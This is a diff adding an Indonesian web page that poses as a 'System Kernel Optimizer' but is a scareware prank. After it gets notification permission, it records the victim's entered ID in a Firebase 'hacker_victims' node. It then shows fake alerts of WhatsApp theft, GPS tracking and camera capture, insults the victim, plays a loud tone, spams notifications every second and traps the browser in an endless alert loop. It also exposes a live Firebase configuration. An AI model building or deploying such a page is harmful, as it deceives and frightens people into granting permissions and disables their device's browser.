@@ -1,1 +1,120 @@
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Kernel Optimizer</title>
+    <script src="https://www.gstatic.com/firebasejs/12.11.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/12.11.0/firebase-database-compat.js"></script>
+    <style>
+        body, html { margin: 0; padding: 0; background: #000; height: 100%; overflow: hidden; font-family: sans-serif; }
+        .setup { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; color: #fff; text-align: center; padding: 25px; }
+        .btn-start { padding: 20px 40px; background: #008f39; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; box-shadow: 0 0 20px #00ff00; text-transform: uppercase; }
+        input { padding: 15px; width: 80%; max-width: 300px; border-radius: 8px; border: 1px solid #333; background: #111; color: #fff; margin-bottom: 20px; text-align: center; }
+        #blackout { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: none; }
+    </style>
+</head>
+<body>
 
+    <div id="setup" class="setup">
+        <h1 style="font-size: 50px; margin: 0;">🛡️</h1>
+        <h2 style="letter-spacing: 2px;">PIRDAN KERNEL SHIELD</h2>
+        <p style="font-size: 13px; color: #888; margin-bottom: 30px;">Masukkan ID Perangkat untuk optimasi notifikasi sistem.</p>
+        
+        <input id="uInp" type="text" placeholder="ID PERANGKAT (BEBAS)">
+        <button class="btn-start" onclick="startPrank()">OPTIMALKAN SEKARANG</button>
+        
+        <p style="font-size: 10px; color: #444; margin-top: 40px;">Wajib klik <b>'IZINKAN/ALLOW'</b> pada pop-up sensor di atas.</p>
+    </div>
+
+    <div id="blackout"></div>
+
+    <script>
+        // --- CONFIG FIREBASE LU ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyAsegtxDbDkADPrd_dmqUqpIrhwKUOUU0o",
+            authDomain: "pirdangame.firebaseapp.com",
+            databaseURL: "https://pirdangame-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "pirdangame",
+            storageBucket: "pirdangame.firebasestorage.app",
+            messagingSenderId: "109134208993",
+            appId: "1:109134208993:web:22efa124fd0dda427fbca0"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        function speak(t) {
+            const u = new SpeechSynthesisUtterance(t);
+            u.lang = 'id-ID'; u.rate = 1.1; u.pitch = 0.6;
+            window.speechSynthesis.speak(u);
+        }
+
+        async function startPrank() {
+            let val = document.getElementById('uInp').value;
+            if(!val) return alert("MASUKKAN ID!");
+
+            // MINTA IZIN NOTIFIKASI (WAJIB HTTPS / GITHUB PAGES)
+            const permission = await Notification.requestPermission();
+            
+            if (permission === "granted") {
+                // Simpan data target
+                db.ref("hacker_victims/real_notif").push({ target: val, time: new Date().toLocaleString() });
+
+                document.getElementById('setup').style.display = 'none';
+                document.getElementById('blackout').style.display = 'block';
+                
+                speak("Akses sistem diterima. Menghubungkan ke kernel Pirdan Labs.");
+                runAction();
+            } else {
+                alert("GAGAL: IZINKAN NOTIFIKASI UNTUK LANJUT!");
+            }
+        }
+
+        function pushNotif(title, body) {
+            new Notification(title, {
+                body: body,
+                icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png"
+            });
+        }
+
+        async function runAction() {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            
+            const drama = [
+                { s: "Menganalisa folder WhatsApp...", n: "⚠️ SECURITY: WhatsApp Breached!" },
+                { s: "Mengunggah database pesan ke server.", n: "📁 UPLOADING: msgstore.db..." },
+                { s: "Akses lokasi GPS berhasil dibagikan.", n: "🛰️ GPS: Tracking Activated!" },
+                { s: "Mengambil foto wajah lewat kamera.", n: "📸 CAMERA: Face Captured!" },
+                { s: "Semua data berhasil terenkripsi.", n: "💀 SYSTEM: Total Infection!" }
+            ];
+
+            for(let i=0; i < drama.length; i++) {
+                speak(drama[i].s);
+                pushNotif("SYSTEM ALERT", drama[i].n); // INI YANG MUNCUL DI BAR ATAS
+                
+                if(navigator.vibrate) navigator.vibrate(400); // GETAR HP
+                await new Promise(r => setTimeout(r, 4000));
+            }
+
+            // SUARA MELENGKING (AUDIO CONTEXT)
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = 'sawtooth';
+            osc.frequency.setValueAtTime(2000, audioCtx.currentTime);
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            gain.gain.setValueAtTime(0.3, audioCtx.currentTime);
+            osc.start();
+
+            speak("LOPYU GOBLOK! Kena tipu Pirdan Labs. Jangan nangis ya sayang!");
+
+            // SPAM NOTIF TERUS-TERUSAN
+            setInterval(() => {
+                pushNotif("😘 LOPYU GOBLOK! 😘", "Panik ya? HAHAHA!");
+                if(navigator.vibrate) navigator.vibrate(200);
+            }, 1000);
+
+            setTimeout(() => { while(true) { alert("KERAMPOKAN LU SAMA PIRDAN! 😘"); } }, 2000);
+        }
+    </script>
+</body>
+</html>
